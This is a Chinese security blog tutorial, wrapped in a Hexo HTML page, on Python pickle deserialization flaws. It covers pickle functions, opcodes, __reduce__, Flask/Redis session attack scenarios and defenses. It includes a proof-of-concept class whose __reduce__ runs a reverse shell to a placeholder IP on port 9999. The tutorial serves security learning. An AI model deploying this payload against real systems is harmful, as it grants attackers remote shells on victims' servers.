@@ -1,0 +1,603 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Yu ting">
+  <meta name="keywords" content="">
+  <title>Python Pickle反序列化漏洞 - liquor&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"liquor-boop.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Python Pickle反序列化漏洞">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-07-23 15:54" pubdate>
+        July 23, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      24
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Python Pickle反序列化漏洞</h1>
+            
+            <div class="markdown-body">
+              <h2 id="Python-序列化与反序列化"><a class="header-anchor" href="#Python-序列化与反序列化">🍭</a>Python 序列化与反序列化</h2>
+<h3 id="Pickle-CPickle模块"><a class="header-anchor" href="#Pickle-CPickle模块">🍭</a>Pickle/CPickle模块</h3>
+<p>在 Python 中 , 包含序列化/反序列化过程的库有 <strong><code>Json模块</code></strong> , <strong><code>Pickle/CPickle模块</code></strong> , <strong><code>Shelve模块</code></strong> , <strong><code>Marshal模块</code></strong> 等 , 我们主要来看 <code>Pickle/CPickle模块</code>。<code>pickle</code>和<code>cPickle</code>的作用和PHP的<code>serialize与unserialize</code>一样，两者只是实现的语言不同，一个是纯Python实现、另一个是C实现，函数调用基本相同。</p>
+<h3 id="Pickle库及函数"><a class="header-anchor" href="#Pickle库及函数">🍭</a>Pickle库及函数</h3>
+<blockquote>
+<p>pickle模块是以二进制的形式序列化后保存到文件中（保存文件的后缀为<code>.pkl</code>），不能直接打开进行预览。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>dumps</td>
+<td>对象反序列化为bytes对象</td>
+</tr>
+<tr>
+<td>dump</td>
+<td>对象反序列化到文件对象，存入文件</td>
+</tr>
+<tr>
+<td>loads</td>
+<td>从bytes对象反序列化</td>
+</tr>
+<tr>
+<td>load</td>
+<td>对象反序列化，从文件中读取数据</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>dump(序列化)</p>
+<blockquote>
+<pre><code class="hljs fortran">&gt;pickle<span class="hljs-number">.</span>dump(obj, <span class="hljs-keyword">file</span>, protocol=<span class="hljs-keyword">None</span>,)</code></pre>
+<p>obj表示要进行封装的对象(必填参数）;file表示obj要写入的文件对象,以二进制可写模式打开即wb(必填参数）</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<p>load（反序列化）</p>
+<blockquote>
+<pre><code class="hljs routeros">&gt;pickle.load(file, *, <span class="hljs-attribute">fix_imports</span>=<span class="hljs-literal">True</span>, <span class="hljs-attribute">encoding</span>=<span class="hljs-string">&quot;ASCII&quot;</span>, <span class="hljs-attribute">errors</span>=<span class="hljs-string">&quot;strict&quot;</span>, <span class="hljs-attribute">buffers</span>=None)</code></pre>
+<p>file文件中读取封存后的对象以二进制可读模式打开即rb(必填参数)</p>
+</blockquote>
+</blockquote>
+<p>实例：</p>
+<p><img src="/2021/07/23/pickle/1.png" srcset="/img/loading.gif" alt="1"></p>
+<p>（摘自<strong>Epicccal</strong>师傅实例）</p>
+<p>原始的 Python 类对象和反序列化生成的 Python 类对象是完全相同。</p>
+<blockquote>
+<p>dumps</p>
+<blockquote>
+<pre><code class="hljs ruby"><span class="hljs-meta">&gt;&gt;</span>pickle.dumps(obj, protocol=None,*,fix_imports=True)</code></pre>
+<p>dumps()方法不需要写入文件中，直接返回一个序列化的bytes对象。</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<p>loads</p>
+<blockquote>
+<pre><code class="hljs routeros">&gt;&gt;pickle.loads(bytes_object, *,<span class="hljs-attribute">fix_imports</span>=<span class="hljs-literal">True</span>, <span class="hljs-attribute">encoding</span>=<span class="hljs-string">&quot;ASCII&quot;</span>. <span class="hljs-attribute">errors</span>=<span class="hljs-string">&quot;strict&quot;</span>)</code></pre>
+<p>loads()方法是直接从bytes对象中读取序列化的信息，而非从文件中读取。</p>
+</blockquote>
+</blockquote>
+<p>实例：</p>
+<p><img src="/2021/07/23/pickle/2.png" srcset="/img/loading.gif" alt="2"></p>
+<p>（摘自<strong>Epicccal</strong>师傅实例）</p>
+<p>接下来就要涉及到序列化字符串是按照什么规则生成</p>
+<h3 id="PVM-Python-Virtual-Machine-Python-虚拟机"><a class="header-anchor" href="#PVM-Python-Virtual-Machine-Python-虚拟机">🍭</a>PVM( <code>Python Virtual Machine</code> , Python 虚拟机 )</h3>
+<h4 id="PVM-的作用"><a class="header-anchor" href="#PVM-的作用">🍭</a><strong><code>PVM</code></strong> 的作用</h4>
+<p>在使用 <strong><code>C , C++</code></strong> 等编译性语言编写的程序时 ,  解释器需要先将源代码编译 ==&gt;链接 ==&gt;执行但是对于 Python 而言 , 它可以直接从源代码运行程序 . Python解释器会将源代码编译为字节码 , 然后将编译后的字节码转发到Python 虚拟机中执行 。所以PVM 是一个用来解释字节码的解释引擎。</p>
+<h4 id="PVM-的工作流程"><a class="header-anchor" href="#PVM-的工作流程">🍭</a><strong><code>PVM</code></strong> 的工作流程</h4>
+<ul>
+<li>
+<p><strong>PVM 会先把源代码编译成字节码</strong> .</p>
+<p>字节码是 Python 语言特有的一种表现形式 , 它不是二进制机器码 , 需要进一步编译才能被机器执行 . 如果 Python 进程在主机上有写入权限 , 那么它会把程序字节码保存为一个以 <strong><code>.pyc</code></strong> 为扩展名的文件 . 如果没有写入权限 , 则 Python 进程会在内存中生成字节码 , 在程序执行结束后被自动丢弃 .一般来说 , 在构建程序时最好给 Python 进程在主机上的写入权限 , 这样只要源代码没有改变 , 生成的 <strong><code>.pyc</code></strong> 文件就可以被重复利用 , 提高执行效率 , 同时隐藏源代码 。</p>
+</li>
+<li>
+<p><strong>然后 , Python 进程会把编译好的字节码转发到 PVM( Python 虚拟机 ) 中</strong> , PVM会循环迭代执行字节码指令 , 直到所有操作被完成 。</p>
+</li>
+</ul>
+<h4 id="PVM-的结构"><a class="header-anchor" href="#PVM-的结构">🍭</a><strong><code>PVM</code></strong> 的结构</h4>
+<p>Pickle是一门基于栈的编程语言 , 有不同的编写方式 , 其本质就是一个轻量级的 PVM .</p>
+<p>轻量级的 PVM 由三个部分组成：</p>
+<ul>
+<li>
+<p><strong>指令处理器( Instruction processor )</strong></p>
+<p>从数据流中读取操作码和参数 , 并对其进行解释处理 . 指令处理器会循环执行这个过程 , 不断改变 stack 和 memo 区域的值 . 直到遇到 &quot; <strong><code>.</code></strong> &quot; 这个结束符号 . 这时 , 最终停留在栈顶的的值将会被作为反序列化对象返回 .</p>
+</li>
+<li>
+<p><strong>栈区( stack )</strong></p>
+<p>由 Python 的列表( list )实现 , 作为流数据处理过程中的暂存区 , 在不断的进出栈过程中完成对数据流的反序列化操作，并最终在栈顶生成反序列化的结果</p>
+</li>
+<li>
+<p><strong>标签区( memo )</strong></p>
+<p>由 Python 的字典( dict )实现 , 可以看作是数据索引或者标记 , 为 PVM 的整个生命周期提供存储功能 .</p>
+</li>
+</ul>
+<p>Pickle 在序列化时最常用到的操作码（指令集）：</p>
+<pre><code class="hljs ada">c : 读取本行的内容作为模块名( <span class="hljs-type">module</span> ) , 读取下一行的内容作为对象名( object ) . 然后将 module.object 作为可调用对象压入到栈中
+
+( : 将一个标记对象压入到栈中 , 用于确定命令执行的位置 . 该标记常常搭配 <span class="hljs-type">t</span> 指令一起使用 , 以便产生一个元组
+
+S : 后面跟字符串 , <span class="hljs-type">PVM</span>会读取引号中的内容 , 直到遇见换行符 , 然后将读取到的内容压入到栈中
+
+t : 从栈中不断弹出数据 , 弹射顺序与压栈时相同 , 直到弹出左括号 . 此时弹出的内容形成了一个元组 , 然后 , 该元组会被压入栈中 .
+
+R : 将之前压入栈中的元组和可调用对象全部弹出 , 然后将该元组作为可调用参数的对象并执行该对象  .最后将结果压入到栈中 .
+
+. : 结束整个 <span class="hljs-type">Pickle</span> 反序列化过程 .</code></pre>
+<h4 id="序列化过程"><a class="header-anchor" href="#序列化过程">🍭</a>序列化过程</h4>
+<ol>
+<li><strong>从对象中提取所有属性</strong></li>
+<li><strong>写入对象的所有模块名和类名</strong></li>
+<li><strong>写入对象所有属性的键值对</strong></li>
+</ol>
+<p>以上实例剖析：</p>
+<p><img src="/2021/07/23/pickle/3.png" srcset="/img/loading.gif" alt="3"></p>
+<h2 id="与-PHP-反序列化的对比"><a class="header-anchor" href="#与-PHP-反序列化的对比">🍭</a>与 PHP 反序列化的对比</h2>
+<p>相比于 PHP 反序列化必须要依赖于当前代码中类的存在以及方法的存在，Python 彻底的面向对象的特性十分优越，Python  除了能反序列化当前代码中出现的类(包括通过 import的方式引入的模块中的类)的对象以外，还能利用其彻底的面向对象的特性来反序列化使用  types 创建的匿名对象（这部分内容在后面会有所介绍），大大拓宽了我们的攻击面。</p>
+<h2 id="Pickle-CPickle-反序列化漏洞分析"><a class="header-anchor" href="#Pickle-CPickle-反序列化漏洞分析">🍭</a>Pickle/CPickle 反序列化漏洞分析</h2>
+<p>每当反序列化过程开始或者结束时 , 都会自动调用一类函数 。如PHP 的 <strong><code>__wakeup()</code></strong> 魔术方法 ,python中则是 <strong><code>__reduce__()</code></strong>  魔术方法。</p>
+<h3 id="reduce"><a class="header-anchor" href="#reduce">🍭</a><code>__reduce__()</code></h3>
+<p>官方文档解释：</p>
+<p><img src="/2021/07/23/pickle/4.png" srcset="/img/loading.gif" alt="4"></p>
+<p><strong>当序列化以及反序列化的过程中碰到一无所知的扩展类型( 比如使用 C 语言实现的 Python 扩展类 )时，可以通过类中定义的 <code>__reduce__()</code> 方法来告知 Python 如何进行序列化或者反序列化操作</strong>。当 <strong><code>__reduce__()</code></strong> 函数返回一个元组时 , 第一个元素是一个可调用对象 , 这个对象会在创建对象时被调用 . 第二个元素是可调用对象的参数 , 同样是一个元组符合 PVM 操作码中 <strong><code>R</code></strong> 操作码实现的功能。在反序列化过程结束的时候 , Python 进程会自动调用 <strong><code>__reduce__()</code></strong> 魔术方法 . 如果我们可以控制被调用函数的参数 , Python 进程就会执行我们的恶意代码（和PHP反序列化漏洞一样）。</p>
+<p>实例：</p>
+<p><img src="/2021/07/23/pickle/5.png" srcset="/img/loading.gif" alt="5"></p>
+<p>（摘自<strong>Epicccal</strong>师傅实例）</p>
+<p>RCE后可bash命令反弹shell或python -c 执行任意 Python 代码:</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle
+<span class="hljs-keyword">import</span> os
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span>(<span class="hljs-params">object</span>):</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span>
+        a = <span class="hljs-string">&quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;xxx.xxx.xxx.xxx&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span>
+        <span class="hljs-keyword">return</span> (os.system,(a,))    
+a=A()
+result = pickle.dumps(a)
+pickle.loads(result)</code></pre>
+<h2 id="反序列化漏洞出现的地方"><a class="header-anchor" href="#反序列化漏洞出现的地方">🍭</a>反序列化漏洞出现的地方</h2>
+<ul>
+<li>
+<p><strong>通常在解析认证token，session的时候</strong></p>
+<p>典型案例就是 flask 配合 redis 在服务端存储 session 的情景， session 是被 pickle  序列化进行存储的，如果你通过 cookie 进行请求 sessionid 的话，session  中的内容就会被反序列化，结合上之前讲过的 redis  的未授权访问，我们就能通过 set 设置自己的 session ,然后通过设置 cookie 去请求 session  的过程中我们自定的内容就会被反序列化，然后我们就达到了执行任意命令或者任意代码的目的</p>
+</li>
+<li>
+<p>可能将对象Pickle后存储成磁盘文件。</p>
+</li>
+<li>
+<p>可能将对象Pickle后在网络中传输。</p>
+</li>
+</ul>
+<h2 id="反序列化漏洞防御"><a class="header-anchor" href="#反序列化漏洞防御">🍭</a>反序列化漏洞防御</h2>
+<ul>
+<li>不在不守信任的通道中传递 pcikle 序列化对象</li>
+<li>在传递序列化对象前请进行签名或者加密，防止篡改和重播</li>
+<li>如果序列化数据存储在磁盘上，请确保不受信任的第三方不能修改、覆盖或者重新创建自己的序列化数据</li>
+<li>将 pickle 加载的数据列入白名单</li>
+</ul>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.guildhab.top/2019/12/python-pickle-cpickle-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e/">https://www.guildhab.top/2019/12/python-pickle-cpickle-反序列化漏洞/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之Python 反序列化漏洞/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">反序列化漏洞</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/python/">python</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/07/20/jwt/">
+                        <span class="hidden-mobile">HFCTF2020||EasyLogin</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
